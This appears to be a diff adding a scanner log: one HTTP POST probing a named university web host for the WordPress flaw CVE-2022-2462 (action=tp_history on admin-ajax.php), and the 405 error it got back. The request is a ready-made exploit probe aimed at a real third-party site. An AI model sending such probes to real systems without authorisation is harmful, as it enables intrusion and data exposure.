@@ -1,0 +1,44 @@
+[CVE-2022-2462] Dumped HTTP request for https://www.tbwl.esrc.unimelb.edu.au/wp-admin/admin-ajax.php
+
+
+POST /wp-admin/admin-ajax.php HTTP/1.1
+Host: www.tbwl.esrc.unimelb.edu.au
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 32
+Accept: */*
+Accept-Language: en
+Content-Type: application/x-www-form-urlencoded
+Accept-Encoding: gzip
+
+action=tp_history&token=&lang=en
+[CVE-2022-2462] Dumped HTTP response https://www.tbwl.esrc.unimelb.edu.au/wp-admin/admin-ajax.php
+
+HTTP/1.1 405 Method Not Allowed
+Connection: close
+Content-Length: 422
+Allow: GET, HEAD, OPTIONS
+Content-Type: text/html; charset=utf-8
+Date: Wed, 06 Aug 2025 15:19:01 GMT
+Server: AmazonS3
+Via: 1.1 e66bc72ce3c158d40bfc4fb21c4eaa06.cloudfront.net (CloudFront)
+X-Amz-Cf-Id: MeaxHWz3uGuxJ9omeN817cZ5ATOreU1znb2IDEFicN3FVhZ21BUqGQ==
+X-Amz-Cf-Pop: IAD55-P6
+X-Cache: Error from cloudfront
+
+<html>
+<head><title>405 Method Not Allowed</title></head>
+<body>
+<h1>405 Method Not Allowed</h1>
+<ul>
+<li>Code: MethodNotAllowed</li>
+<li>Message: The specified method is not allowed against this resource.</li>
+<li>Method: POST</li>
+<li>ResourceType: OBJECT</li>
+<li>RequestId: X4B95CX2MC9NZ5JW</li>
+<li>HostId: MkZ9tCocRxY3EwukMFdYuDj7oySxfkqDgox8l9bc5hJxctXJpE67R/aph7haroKfRHLZKn9jRjQ=</li>
+</ul>
+<hr/>
+</body>
+</html>
+
